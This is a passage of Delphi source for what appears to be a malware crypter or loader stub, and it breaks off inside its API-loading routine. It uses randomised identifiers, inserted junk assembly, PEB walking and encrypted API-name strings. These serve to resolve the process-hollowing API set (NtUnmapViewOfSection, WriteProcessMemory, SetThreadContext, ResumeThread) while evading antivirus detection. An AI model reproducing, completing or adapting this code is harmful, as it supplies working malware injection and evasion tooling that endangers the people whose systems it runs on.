program XYnj_ppJZyeqwJJ;
//{$IMAGEBASE $00001200}
{$IMAGEBASE $23240000}

uses
  ipEujXlZCQ,
xnmSNWTWeQgQwcysQJjTkynaftMsNwP,
NrFit_l,
FARKPd,
ukZaZKdr_dinPprS,
BNtHx,
PrMPTqkZhN,
sKGwYjl_EqPPQCKoHp,
eSZfUXHhDADdSbqe_PUd,
aDanCuepfoTnH,
_BDAcxALWAbKzgbCmaA,
gZjZM,
EknHrmeyeqpVYRffUPzCrnbKGPDHtECB,
QusyFAeAdZ,
uuUidlcqNkbM_CecyWxojm,
nzlkX,
xYRwqwUsAJeRfSjqFVawMpYlGutGGg,
VsDcBDESGEEkHBakafbHCdXXfctFKR,
RGAxZMaMTtyyiASyLtGFVYVf,
hiZASFsGeJS,
oLtjpEJoYcTMlSmBrbAnhrWMFakEUHh,
TUCRs,
uNrGNNdYU,
NghQbonehyUhMQJKykuRRk_AZMrSWD_PSj,
RKmMLoZtUPafchzxSTjKVlSWs,
PRAlBelzikmX,
n_KHujQxFQDTZngTxglRJJgfxFZN,
nBjKidSltUswpJtpVmrjJnWNdYlg,
bJwPEZ,
PtDeQFjHaTKclykCnMMm,
dmsbTkT,
xBrMcNUWRzEckfZqwUsNdSb,
eslAUfJWCrWWNgLYfzaueUKXKVoyguRUSj,
_sKRXWDxXEzGVDRmFnNxeQmuGcAsm,
VCScEeGNmlGPpSKVJFZgWTjaxcYHVkK,
CkcVSdpZcMsnFeHjQGigePxqLoxjGSRYYz,
BZggYaypxjppRoiYmsxXGx__ASU_aMbCb,
yWTpJoQuQYTMmoxhlKjucmZSjoBl,
gzsrqh_deSbYcpBF,
YSlPqdrdTGm_TFiZPya,
KmYoUNFijzUpbpC,
QruQDnjqQBuLptaLUJkDcftHmTdgdkEq,
zezisHPabem,
JS_ktHNQLNFYrCTRFJuAmLCEqtndo,
hmmRERznSJhrVnJ,
SLQMmxZKKT,
NaMiJFsDWGfJzKMSpCPfLjqGTLl,
iMQFfzuGXnSTAYezPXJEnjgGZeHh,
GYVpKpZqgSMSTUgZFBnllR,
WXBMooFoG,
NCQbWhqMNpBNuQ,
KTMxspLGZdubVPmrocQnmtKPqxEVqVD,
HeUwLBVlH_PaxZnjoNtm,
qLfoYACxybzzNlmxuPCmoa,
gKHuQfD_ziNsiqhlqwYLbwPF,
RjlrxLdWqrTxnNsgVTKf,
obcKVjRHMoQNjyKbTcbAzaMgFowEm,
JuVWEiPWVVnhiMyBEydAeWcoNNPbXkeE,
HQEleWU_AZqABhpeRBetbEs,
wuVcNheENyGL,
uQErl,
FpnGdudHFmWcCuHB,
ehea_TQuciUszfaxWb,
JhFLYCNjM,
NcrlFnuuAwcRXYcUKAxFsMBAyNxHEa,
RoxJXgf,
hjnJxiBYd_xmgxqkUJMx_qWUwRnuG,
yQDnRxUrK,
yuaDqbUTiVpXm,
uVHaQakJlJ,
eBTScZSVakgXGWgsoNLAtNDGQbyosaJf,
mzBRJqZzHlgYoGSFFoNxVH,
ffQfpkJYPJjbljlGxMnHXRbeczD,
gxKZKaDlTwPgHRmMXnmCu,
YrzJyGuYrlDLhiqeirFeJAyDpmYYf,
XofmKfzoJ,
oQCqCYTjUFEfaucaXZxKTztrLChuh,
c_LGNEbNBfd,
PRFFQUrtxXBghXGFTeotEHHGyeZUuzde,
APptgoFlzPMZYF_dhY,
axyQZtkjXs,
uGEbGBn_nZnbcQYmFVPenX,
ofksJdRjxfLJMCCUUNSJyZGWGph,
MXbLgACWTbJaJmVPTXieE,
WTKKNTK__cHb,
cwfslSbhtwJtBzFKGDZLPMKaiVqZP,
BGkcSHDRCaErVuHkzjCqNtmDPJfCqucgn_,
sxgmeUxeGQoRdLRETlAjGHxiWDzY,
SgoJWZccftFLNGtgnQtYXrirkaobs,
woyqZbhFMXiwNkHAcFWTHGHeZRuQMzLEM,
MQWuSVAAXmBsFbdXkibPlX,
QwmfTGontGYajUSKLdTlhrMCLwhuJXFn,
qyHSUf,
APFhHQHJbC,
nBDUXtaDluhTDGAlRSUmtpDTnu,
phVDZgPqHPC_hzpZrMKJpKVxCnqdYlPjsS,
UpelbiVVorekhdCtgBmCbatkrfySrm,
SZpYFJfMoPVfcngm,
xZRJetdBYZ,
TxtLszZqFmQdrA,
Windows, SysUtils, Classes, Graphics,
EZpeoinNkRNKrRPnK_gjWfTFxAmTaqgoh,
baPtrZioCfqw,
auzJRLnUjjtQTKLewrVeTLKCbUNAV_qyiV,
FtbtnwlHTtpfG_lgGCZrLVPiZ,
ltBfLfjyBEluwoM,
szUaXQzRhYRRpQlPMUCiYfX,
xWAPtkePGbFdGUliL,
DyXxSjuwAtHuTtmRjpLJKxegF,
zzybGuWSu_JhlhqxTj_,
ABSzVyLSgUAKhaFlZeFKRU,
kjdqixsdWumj,
MjKGeYDFFqezGDdjJBVLFfxtpejAfefkp,
zzDGgmVnAhCi_m,
aZfhtZrwdtpJYtqTCsFFAqjwthPRlLqYzd,
ZXLKFxwMtzXgZQFs,
MAbApHFSFYnqYJRBmJzEdB_PP,
DrXLBVzgJNWPhaYXFLx,
MKKxuAGYFPrMhLklAmPAPPAZAYoAEiNd,
tBClmTxYsGHGJMXUk,
WTuQVnLrXBQMWeZ,
nXQgASdYT,
gttsgztkDuTStaF_Gpp,
_NkFRURNpWZWM,
nVwJnQaFmw,
jGxSXnwPNjhtkCi,
oRMTijWuQmQXPHCsSADBopH,
LuhuZKQHUAW,
slbkRcEHFtm,
QdSCo_su,
bsPTdjqWxahEhQGbEdpD,
P_bW_gzPuzcUNJqiepiKdpYzhQsjWCNdt,
imetWZARwfPdQXHPCJek,
EVswnWs,
PXVVuH,
PxxLuRAHb_tGADGGCiRSTDgijAiiBqLUx,
gPmTH,
TGdfyqchVpkWGpkiEYzLKtMqNnSfV,
lCQ_zBmZTnC_WrpiGWSTeAXyL__sFANF,
hSMWWLG,
RcUbWunRECJpsBE,
depVDrffG,
aHHgHxsykpCm_VVg,
TMaiBEekFNcmQxRjUJesBbHrqAWFWaZnG;

{
uses
  Windows,
  gttsgztkDuTStaF_Gpp;
}

var
  CreateProcess: function(lpApplicationName: PChar; lpCommandLine: PChar;
    lpProcessAttributes, lpThreadAttributes: PSecurityAttributes;
    bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer;
    lpCurrentDirectory: PChar; const lpStartupInfo: TStartupInfo;
    var lpProcessInformation: TProcessInformation): BOOL; stdcall;
  GetThreadContext: function(hThread: THandle; var lpContext: TContext): BOOL; stdcall;
  VirtualAllocEx: function(hProcess: THandle; lpAddress: Pointer;
    dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer; stdcall;
  SetThreadContext: function(hThread: THandle; const lpContext: TContext): BOOL; stdcall;
  ReadFile: function(hFile: THandle; var Buffer; nNumberOfBytesToRead: DWORD;
    var lpNumberOfBytesRead: DWORD; lpOverlapped: POverlapped): BOOL; stdcall;


  NtUnmapViewOfSection, ReadProcessMemory, WriteProcessMemory,
  VirtualProtectEx, ResumeThread, CloseHandle,
  SetFilePointer, WriteFile, Sleep, GetFileSize, CreateFile: pointer;

function CallAPI(ptrProc: pointer; ArgsList : array of const): cardinal;
var
  i:            Integer;
  tempCardinal: Cardinal;
begin
  Result := 0;
  for i := High( ArgsList ) downto  Low( ArgsList ) do if ArgsList[i].VInteger = 99999 then break;
  if i <= 0 then Exit;

  if ptrProc <> nil then
  begin
    for i := i - 1 downto  Low(ArgsList) do
    begin
      tempCardinal := ArgsList[i].VInteger;
      asm
        push tempCardinal
      end;
    end;
    asm
      call ptrProc
      mov Result, eax
    end;
  end;
end;

(*  
type
  _CLIENT_ID = packed record
    UniqueProcess: DWORD;
    UniqueThread: DWORD;
  end;
  CLIENT_ID = _CLIENT_ID;
  PCLIENT_ID = ^_CLIENT_ID;
  _SYSTEM_PERFORMANCE_INFORMATION = record //Information Class 2
    IdleTime: LARGE_INTEGER;
    ReadTransferCount: LARGE_INTEGER;
    WriteTransferCount: LARGE_INTEGER;
    OtherTransferCount: LARGE_INTEGER;
    ReadOperationCount: cardinal;
    WriteOperationCount: cardinal;
    OtherOperationCount: cardinal;
    AvailablePages: cardinal;
    TotalCommittedPages: cardinal;
    TotalCommitLimit: cardinal;
    PeakCommitment: cardinal;
    PageFaults: cardinal;
    WriteCopyFaults: cardinal;
    TransitionFaults: cardinal;
    Reserved1: cardinal;
    DemandZeroFaults: cardinal;
    PagesRead: cardinal;
    PageReadIos: cardinal;
    Reserved2: array[0..1] of cardinal;
    PagefilePagesWritten: cardinal;
    PagefilePageWriteIos: cardinal;
    MappedFilePagesWritten: cardinal;
    MappedFilePageWriteIos: cardinal;
    PagedPoolUsage: cardinal;
    NonPagedPoolUsage: cardinal;
    PagedPoolAllocs: cardinal;
    PagedPoolFrees: cardinal;
    NonPagedPoolAllocs: cardinal;
    NonPagedPoolFrees: cardinal;
    TotalFreeSystemPtes: cardinal;
    SystemCodePage: cardinal;
    TotalSystemDriverPages: cardinal;
    TotalSystemCodePages: cardinal;
    SmallNonPagedLookasideListAllocateHits: cardinal;
    SmallPagedLookasideListAllocateHits: cardinal;
    Reserved3: cardinal;
    MmSystemCachePage: cardinal;
    PagedPoolPage: cardinal;
    SystemDriverPage: cardinal;
    FastReadNoWait: cardinal;
    FastReadWait: cardinal;
    FastReadResourceMiss: cardinal;
    FastReadNotPossible: cardinal;
    FastMdlReadNoWait: cardinal;
    FastMdlReadWait: cardinal;
    FastMdlReadResourceMiss: cardinal;
    FastMdlReadNotPossible: cardinal;
    MapDataNoWait: cardinal;
    MapDataWait: cardinal;
    MapDataNoWaitMiss: cardinal;
    MapDataWaitMiss: cardinal;
    PinMappedDataCount: cardinal;
    PinReadNoWait: cardinal;
    PinReadWait: cardinal;
    PinReadNoWaitMiss: cardinal;
    PinReadWaitMiss: cardinal;
    CopyReadNoWait: cardinal;
    CopyReadWait: cardinal;
    CopyReadNoWaitMiss: cardinal;
    CopyReadWaitMiss: cardinal;
    MdlReadNoWait: cardinal;
    MdlReadWait: cardinal;
    MdlReadNoWaitMiss: cardinal;
    MdlReadWaitMiss: cardinal;
    ReadAheadIos: cardinal;
    LazyWriteIos: cardinal;
    LazyWritePages: cardinal;
    DataFlushes: cardinal;
    DataPages: cardinal;
    ContextSwitches: cardinal;
    FirstLevelTbFills: cardinal;
    SecondLevelTbFills: cardinal;
    SystemCalls: cardinal;
  end;
  SYSTEM_PERFORMANCE_INFORMATION = _SYSTEM_PERFORMANCE_INFORMATION;
  PSYSTEM_PERFORMANCE_INFORMATION = ^_SYSTEM_PERFORMANCE_INFORMATION;
  PEXCEPTION_REGISTRATION_RECORD = ^_EXCEPTION_REGISTRATION_RECORD;
  _EXCEPTION_REGISTRATION_RECORD = record
    pNext: PEXCEPTION_REGISTRATION_RECORD;
    pfnHandler: pointer;
  end;

  PNT_TIB = ^_NT_TIB;
  _NT_TIB = record
    ExceptionList: ^_EXCEPTION_REGISTRATION_RECORD;
    StackBase: Pointer;
    StackLimit: Pointer;
    SubSystemTib: Pointer;
    SubData: Pointer;
    //FiberData: Pointer;
    //Version: DWORD;
    ArbitraryUserPointer: Pointer;
    SelfPointer: PNT_TIB;
  end;
  NT_TIB = _NT_TIB;

  _PEB_LDR_DATA = record
    Length: ULONG;
    Initialized: BOOLEAN;
    SsHandle: Pointer;
    InLoadOrderModuleList: LIST_ENTRY; // ref. to PLDR_DATA_TABLE_ENTRY->InLoadOrderModuleList
    InMemoryOrderModuleList: LIST_ENTRY; // ref. to PLDR_DATA_TABLE_ENTRY->InMemoryOrderModuleList
    InInitializationOrderModuleList: LIST_ENTRY; // ref. to PLDR_DATA_TABLE_ENTRY->InInitializationOrderModuleList
  end;
  PEB_LDR_DATA = _PEB_LDR_DATA;
  PPEB_LDR_DATA = ^_PEB_LDR_DATA;

  _UNICODE_STRING = record
    Length: WORD;
    MaxLength: WORD;
    PStr: PWideChar;
  end;
  UNICODE_STRING = _UNICODE_STRING;
  PUNICODE_STRING = ^_UNICODE_STRING;

  _CURDIR = record
    DosPath: UNICODE_STRING;
    Handle: THANDLE;
  end;
  CURDIR = _CURDIR;
  PCURDIR = ^_CURDIR;

  _RTL_DRIVE_LETTER_CURDIR = record
    Flags: WORD;
    Length: WORD;
    TimeStamp: DWORD;
    DosPath: UNICODE_STRING;
  end;
  RTL_DRIVE_LETTER_CURDIR = _RTL_DRIVE_LETTER_CURDIR;
  PRTL_DRIVE_LETTER_CURDIR = ^_RTL_DRIVE_LETTER_CURDIR;

  _PROCESS_PARAMETERS = record
    MaximumLength: ULONG;
    Length: ULONG;
    Flags: ULONG; // PROCESS_PARAMETERS_NORMALIZED
    DebugFlags: ULONG;
    ConsoleHandle: THANDLE;
    ConsoleFlags: ULONG;
    StandardInput: THANDLE;
    StandardOutput: THANDLE;
    StandardError: THANDLE;
    CurrentDirectory: CURDIR;
    DllPath: UNICODE_STRING;
    ImagePathName: UNICODE_STRING;
    CommandLine: UNICODE_STRING;
    Environment: PWideChar;
    StartingX: ULONG;
    StartingY: ULONG;
    CountX: ULONG;
    CountY: ULONG;
    CountCharsX: ULONG;
    CountCharsY: ULONG;
    FillAttribute: ULONG;
    WindowFlags: ULONG;
    ShowWindowFlags: ULONG;
    WindowTitle: UNICODE_STRING;
    Desktop: UNICODE_STRING;
    ShellInfo: UNICODE_STRING;
    RuntimeInfo: UNICODE_STRING;
    CurrentDirectores: array[0..31] of RTL_DRIVE_LETTER_CURDIR;
  end;
  PROCESS_PARAMETERS = _PROCESS_PARAMETERS;
  PPROCESS_PARAMETERS = ^_PROCESS_PARAMETERS;

  PPEB_FREE_BLOCK = ^_PEB_FREE_BLOCK;
  _PEB_FREE_BLOCK = record
    Next: PPEB_FREE_BLOCK;
    Size: ULONG;
  end;
  PEB_FREE_BLOCK = _PEB_FREE_BLOCK;

  _RTL_BITMAP = record
    SizeOfBitMap: DWORD;
    Buffer: PDWORD;
  end;
  RTL_BITMAP = _RTL_BITMAP;
  PRTL_BITMAP = ^_RTL_BITMAP; //*
  PPRTL_BITMAP = ^PRTL_BITMAP; //**

  _SYSTEM_STRINGS = record
    SystemRoot: UNICODE_STRING; // C:\WINNT
    System32Root: UNICODE_STRING; // C:\WINNT\System32
    BaseNamedObjects: UNICODE_STRING; // \BaseNamedObjects
  end;
  SYSTEM_STRINGS = _SYSTEM_STRINGS;
  PSYSTEM_STRINGS = ^_SYSTEM_STRINGS;

  _TEXT_INFO = record
    Reserved: Pointer;
    SystemStrings: PSYSTEM_STRINGS; //<-see above
  end;
  TEXT_INFO = _TEXT_INFO;
  PTEXT_INFO = ^_TEXT_INFO;

  // * - need additional ZwReadVirtualMemory call
  _PEB = record
    InheritedAddressSpace: UCHAR; // 0
    ReadImageFileExecOptions: UCHAR; // 1
    BeingDebugged: UCHAR; // 2    <- IsDebuggerPresent ha-ha-ha so simple, so stupid!
    SpareBool: BYTE; // 3  <-
    Mutant: Pointer; // 4 *
    ImageBaseAddress: Pointer; // 8 *
    Ldr: PPEB_LDR_DATA; // C       *
    ProcessParameters: PPROCESS_PARAMETERS; // 10 *
    SubSystemData: Pointer; // 14     *
    ProcessHeap: Pointer; // 18        *
    FastPebLock: Cardinal; // 1C
    FastPebLockRoutine: Pointer; // 20     *
    FastPebUnlockRoutine: Pointer; // 24    *
    EnvironmentUpdateCount: ULONG; // 28
    KernelCallbackTable: PPOINTER; // 2C
    EventLogSection: Pointer; // 30           *
    EventLog: Pointer; // 34                  *
    FreeList: PPEB_FREE_BLOCK; // 38 *
    TlsExpansionCounter: ULONG; // 3C
    TlsBitmap: PRTL_BITMAP; // 40      *
    TlsBitmapData: array[0..1] of ULONG; // 44
    ReadOnlySharedMemoryBase: Pointer; // 4C *
    ReadOnlySharedMemoryHeap: Pointer; // 50  *
    ReadOnlyStaticServerData: PTEXT_INFO; // 54 *
    InitAnsiCodePageData: Pointer; // 58    *
    InitOemCodePageData: Pointer; // 5C     *
    InitUnicodeCaseTableData: Pointer; // 60 *
    KeNumberProcessors: ULONG; // 64
    NtGlobalFlag: ULONG; // 68
    d6C: DWORD; // 6C
    MmCriticalSectionTimeout: Int64; // 70
    MmHeapSegmentReserve: ULONG; // 78
    MmHeapSegmentCommit: ULONG; // 7C
    MmHeapDeCommitTotalFreeThreshold: ULONG; // 80
    MmHeapDeCommitFreeBlockThreshold: ULONG; // 84
    NumberOfHeaps: ULONG; // 88
    AvailableHeaps: ULONG; // 8C
    ProcessHeapsListBuffer: PHANDLE; // 90  *
    GdiSharedHandleTable: Pointer; // 94   *
    ProcessStarterHelper: Pointer; // 98   *
    GdiDCAttributeList: Pointer; // 9C     *
    LoaderLock: cardinal; // A0
    //RTlGetVersion uses this
    NtMajorVersion: ULONG; // A4
    NtMinorVersion: ULONG; // A8
    NtBuildNumber: SmallInt; // AC
    NtCSDVersion: SmallInt; // AE
    PlatformId: ULONG; // B0
    //-------------------------
    Subsystem: ULONG; // B4
    MajorSubsystemVersion: ULONG; // B8
    MinorSubsystemVersion: ULONG; // BC
    AffinityMask: ULONG; // C0
    GdiHandleBuffer: array[0..33] of ULONG; // C4
    PostProcessInitRoutine: ULONG; // 14C
    TlsExpansionBitmap: ULONG; // 150
    TlsExpansionBitmapBits: array[0..127] of UCHAR; // 154
    SessionId: ULONG; // 1D4
    AppCompatFlags: Int64; // 1D8
    CSDVersion: PWORD; // 1E0    *
  end;
  PEB = _PEB;
  PPEB = ^_PEB;

  _TEB = record //magic FS register data
    Tib: NT_TIB;
    EnvironmentPointer: Pointer;
    Cid: CLIENT_ID;
    ActiveRpcInfo: THANDLE;
    ThreadLocalStoragePointer: Pointer;
    Peb: PPEB;
    LastErrorValue: cardinal; //GetLastError, SetLastError uses this
    CountOfOwnedCriticalSections: cardinal;
    CsrClientThread: Pointer;
    Win32ThreadInfo: Pointer;
    Win32ClientInfo: array[0..30] of cardinal;
    WOW32Reserved: Pointer;
    CurrentLocale: cardinal;
    FpSoftwareStatusRegister: cardinal;
    SystemReserved1: array[0..53] of Pointer;
    Spare1: Pointer;
    ExceptionCode: Integer;
    SpareBytes1: array[0..39] of cardinal;
    SystemReserved2: array[0..9] of Pointer;
    gdiRgn: cardinal;
    gdiPen: cardinal;
    gdiBrush: cardinal;
    RealClientId: CLIENT_ID;
    GdiCachedProcessHandle: Pointer;
    GdiClientPID: cardinal;
    GdiClientTID: cardinal;
    GdiThreadLocaleInfo: Pointer;
    UserReserved: array[0..4] of Pointer;
    glDispatchTable: array[0..279] of Pointer;
    glReserved1: array[0..25] of cardinal;
    glReserved2: Pointer;
    glSectionInfo: Pointer;
    glSection: Pointer;
    glTable: Pointer;
    glCurrentRC: Pointer;
    glContext: Pointer;
    LastStatusValue: ULONG;
    StaticUnicodeString: UNICODE_STRING;
    StaticUnicodeBuffer: array[0..260] of WCHAR;
    DeallocationStack: Pointer;
    TlsSlots: array[0..63] of Pointer;
    TlsLinks: LIST_ENTRY;
    Vdm: Pointer;
    ReservedForNtRpc: Pointer;
    DbgSsReserved: array[0..1] of Pointer;
    HardErrorDisabled: cardinal;
    Instrumentation: array[0..15] of Pointer;
    WinSockData: Pointer;
    GdiBatchCount: cardinal;
    Spare2: cardinal;
    Spare3: cardinal;
    Spare4: cardinal;
    ReservedForOle: Pointer;
    WaitingOnLoaderLock: cardinal;
    StackCommit: Pointer;
    StackCommitMax: Pointer;
    StackReserve: Pointer;
  end;
  TEB = _TEB;
  PTEB = ^_TEB;

  PLIST_ENTRY = ^_LIST_ENTRY;
  _LIST_ENTRY = record
    Flink: PLIST_ENTRY;
    Blink: PLIST_ENTRY;
  end;
  LIST_ENTRY = _LIST_ENTRY;
  RESTRICTED_POINTER = ^_LIST_ENTRY;
  PRLIST_ENTRY = ^_LIST_ENTRY;

type
  _LDR_DATA_TABLE_ENTRY = record
    InLoadOrderModuleList: LIST_ENTRY;
    InMemoryOrderModuleList: LIST_ENTRY;
    InInitializationOrderModuleList: LIST_ENTRY;
    DllBase: pointer;
    EntryPoint: Pointer;
    SizeOfImage: ULONG; // in bytes
    FullDllName: UNICODE_STRING;
    BaseDllName: UNICODE_STRING;
    Flags: ULONG; // LDR_*  see above
    LoadCount: smallInt;
    TlsIndex: smallInt;
    HashLinks: LIST_ENTRY;
    SectionPointer: Pointer;
    CheckSum: ULONG;
    TimeDateStamp: ULONG;
// LoadedImports: Pointer ; // seems they are exist only on XP and maybe later !!!
// EntryPointActivationContext: Pointer ; // -same-
  end;
  LDR_DATA_TABLE_ENTRY = _LDR_DATA_TABLE_ENTRY;
  PLDR_DATA_TABLE_ENTRY = ^_LDR_DATA_TABLE_ENTRY;
  PLDR_MODULE = ^_LDR_DATA_TABLE_ENTRY;


function GetTEB: PTEB;
asm
  mov eax, large fs:18h
  retn
end;

function strlenA(const s: PAnsiChar): cardinal;
asm
  mov edx, edi
  mov edi, eax
  or ecx, -1
  xor eax, eax
  repne scasb
  dec eax
  dec eax
  sub eax, ecx
  mov edi, edx
end;

function GetProcAddress(hModule: THANDLE; API: pChar): Pointer;
var
  pTeb1: PTEB;
  pINH: PImageNtHeaders;
  pIDD: PImageDataDirectory;
  pIED: PImageExportDirectory;
  pdwFuncs1, pdwFuncs: Pcardinal;
  pdwNames: Pcardinal;
  pdwOrdinals: PWORD;
  dwOrd1: DWORD;
  i, k: cardinal;
  apiname: pchar;
  lengthapi: cardinal;
begin
  
  result := nil;
  
  pTeb1 := GetTEB();
  
  if (hModule = 0) then hModule := Cardinal(pTeb1^.Peb^.ImageBaseAddress);
  
  pINH := PImageNtHeaders(LongInt(hModule) + PImageDosHeader(hModule)^._lfanew);
asm
ja @00000007
@00000007:
jno @00000005
@00000005:
push edi
sal esp, $00000060
pop edi
end;
  
  pIDD := PImageDataDirectory(Cardinal(@pINH^.OptionalHeader.DataDirectory) + IMAGE_DIRECTORY_ENTRY_EXPORT);
  
  pIED := PImageExportDirectory(cardinal(hModule) + pIDD^.VirtualAddress);
  
  pdwFuncs := Pcardinal(cardinal(hModule) + Cardinal(pIED^.AddressOfFunctions));
  
  pdwNames := Pcardinal(cardinal(hModule) + Cardinal(pIED^.AddressOfNames));
  
  pdwOrdinals := PWORD(cardinal(hModule) + Cardinal(pIED^.AddressOfNameOrdinals));
  
  pdwFuncs1 := pdwFuncs;
  
  for i := 0 to pIED^.NumberOfNames - 1 do
  begin
  
    dwOrd1 := pdwOrdinals^;
asm
jc @00000008
@00000008:
push edi
push ecx
test eax, $0000954E
pop ecx
pop edi
jge @00000004
@00000004:
rol di, $000000A0
jge @00000007
@00000007:
push ebx
push $0000000D
add esp, $00000004
pop ebx
cld 
end;
  
    k := 0;
//GerarLixo()  
    pdwFuncs := pdwFuncs1;
  
    while (k < dwOrd1) do
    begin
      inc(pdwFuncs);
      inc(k);
    end;
  
    if (pdwFuncs^ < pIDD^.VirtualAddress) or (pdwFuncs^ >= pIDD^.VirtualAddress + pIDD^.Size) then
    begin
  
      apiname := PChar(hModule + pdwNames^);
  
      lengthapi := strlenA(apiname);
  
      if lstrcmpA(apiname, API) = 0 then
      begin
        result := Pointer(cardinal(hModule) + pdwFuncs^);
        exit;
      end;
    end;
    inc(pdwOrdinals);
  
    inc(pdwNames);
  
  end;
end;

function GetmoduleHandle(Name: pChar): THANDLE;
var
  pTeb1: PTEB;
  f: PLIST_ENTRY;
  cur: PLIST_ENTRY;
  item:PLDR_MODULE;
begin
  result := 0;
  
  pTeb1 := GetTEB();
  
  if (Name = nil) then
  begin
    result := Cardinal(pTeb1^.Peb^.ImageBaseAddress);
    exit;
  end;
  
  f := @pTeb1^.Peb^.Ldr^.InMemoryOrderModuleList;
asm
or cl, cl
cmc 
push ebp
dec ebp
pop ebp
end;
  
  cur := f.Flink;
  
  while Assigned(cur) and (cur <> f) do
  begin
  
    item := PLDR_MODULE(Dword(cur)-dword(@LDR_DATA_TABLE_ENTRY(nil^).InMemoryOrderModuleList));
  
    if (item <> nil) and (item.BaseDllName.PStr <> nil) then
    begin
  
      if lstrcmpA(pChar(AnsiString(item.BaseDllName.PStr)), Name) = 0 then
      begin
        result := THANDLE(item.DllBase);
        break;
      end;
    end;
  
    cur := cur^.Flink;
  end;
end;
*)

function GetProcAddress(Module: hModule; Name: PChar): Pointer;
asm
        XOR   ECX,ECX                 // except frame
        PUSH  OFFSET @@6
        PUSH  DWord Ptr FS:[ECX]
        MOV   FS:[ECX],ESP
        PUSH  EBP
        PUSH  EBX
        MOV   EBP,EDX
        AND   EAX,not 3
        PUSH  EDI
        MOV   EDX,[EAX + 03Ch]
        PUSH  ESI
        TEST  EBP,EBP
        JZ    @@5
        CMP   Word Ptr [EAX + EDX],'EP'
        MOV   EDX,[EAX + EDX + 078h]
        JNZ   @@5
        ADD   EDX,EAX
        TEST  EBP,0FFFF0000h
        MOV   EBX,EAX
        JZ    @@3                         // import by ordinal ??
        MOV   EAX,[EDX + 018h]
        MOV   ECX,[EDX + 020h]
        NOT   EAX
@@1:    INC   EAX
        MOV   ESI,EBP
        JZ    @@4
        MOV   EDI,[EBX + ECX]
        ADD   ECX,4
        ADD   EDI,EBX
@@2:    CMPSB
        JNE   @@1
        CMP   Byte Ptr [ESI - 1],0
        JNE   @@2
        ADD   EAX,[EDX + 018h]
        MOV   ECX,[EDX + 024h]
        ADD   ECX,EBX
        MOVZX EBP,Word Ptr [ECX + EAX * 2]
        INC   EBP
@@3:    MOV   ECX,[EDX + 01Ch]
        DEC   EBP
        ADD   ECX,EBX
        MOV   EAX,[ECX + EBP * 4]
        ADD   EAX,EBX
@@4:    POP   ESI
        POP   EDI
        POP   EBX
        POP   EBP
        POP   DWord Ptr FS:[0]
        POP   ECX
        RET
@@5:    XOR   EAX,EAX
        JMP   @@4
@@6:    MOV   EAX,[ESP + 00Ch]                 // except handler
        PUSH  OFFSET @@5
        POP   DWord Ptr [EAX + 0B8h]
        SUB   EAX,EAX
end;

function LoadLibrary(lpLibFileName: PAnsiChar): HMODULE;
  function GetKernel32Address: Cardinal;
  var
    AAAAAA                                        : Integer;
    BBBBBB, CCCCCC, DDDDDD, EEEEEE, FFFFFF, GGGGGG: Pointer;
  begin
    asm
      MOV EAX,FS:[18H]
      MOV AAAAAA,EAX
    end;
    BBBBBB := Pointer(Pointer(Integer(AAAAAA) + $30)^);
  
    CCCCCC := Pointer(Pointer(Integer(BBBBBB) + $0C)^);
  
    DDDDDD := Pointer(Pointer(Integer(CCCCCC) + $0C)^);
  
    EEEEEE := Pointer(Pointer(Integer(DDDDDD) + $00)^);
  
    FFFFFF := Pointer(Pointer(Integer(EEEEEE) + $00)^);
  
    GGGGGG := Pointer(Pointer(Integer(FFFFFF) + $18)^);
  
    Result := Integer(GGGGGG);
  
  end;
var
  pLoadLibrary: function(lpLibFileName: PAnsiChar): HMODULE; stdcall;
begin
  pLoadLibrary := GetProcAddress(GetKernel32Address, pChar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQ+L4jOBANf2Kjy27T', 'tsGyLUykEbuNF_SJVEZaAJ')));
  Result := pLoadLibrary(lpLibFilename);
end;

procedure LoadApis;
var
  Ntdll, Kernel32: string;
begin
  Ntdll := MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQ52ne5LpxOLAZ', 'aFkBtd_dJYFeuXDoDrmVWwy');
  kernel32 := MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQdlXu5vXZ/1DxOLAZ', 'AHqWCXUeezMXYyKfUWEYLld');

  NtUnmapViewOfSection := GetProcAddress(GetmoduleHandle(pChar(Ntdll)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQ+2nX5vkjybONOMV0O7h7f9nN5lF', 'TKtTrWlTjdAlWHuj')));
asm
jc @00000008
@00000008:
push edi
push ecx
test eax, $0000954E
pop ecx
pop edi
jge @00000004
@00000004:
rol di, $000000A0
jge @00000007
@00000007:
push ebx
push $0000000D
add esp, $00000004
pop ebx
cld 
end;

  CreateProcess := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQR9K7fMn73SKWflX1y8B', 'rUhjgiNKAWnzLYotrnzBnJit')));

  GetThreadContext := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQnlX8XLjuOibeRl4xVLXFVJ', 'alFSVFADh')));

  ReadProcessMemory := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQ3vXjObTu5lh7y9hhOikWy2e', 'WcihnWTrmfjqXMy')));

  WriteProcessMemory := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQX9KNVLXRyv4EOMh1+iXC59KP', 'NsJlwnJ')));

  VirtualAllocEx := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQXv7uVSXj5BbZ5L4EnMq', 'otQEEhdADKtaQYbANEWRrxyf')));

  VirtualProtectEx := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQXv7uVSXj5bTu59n7f9nbsJ', 'oSccNLfLQ')));

  SetThreadContext := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQ3lX8XLjuOibeRl4xVLXFVJ', 'lkADULwlEfkyhhm')));

  ResumeThread := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQ3vX1Vik7XLjuOibe', 'ddYWQP')));

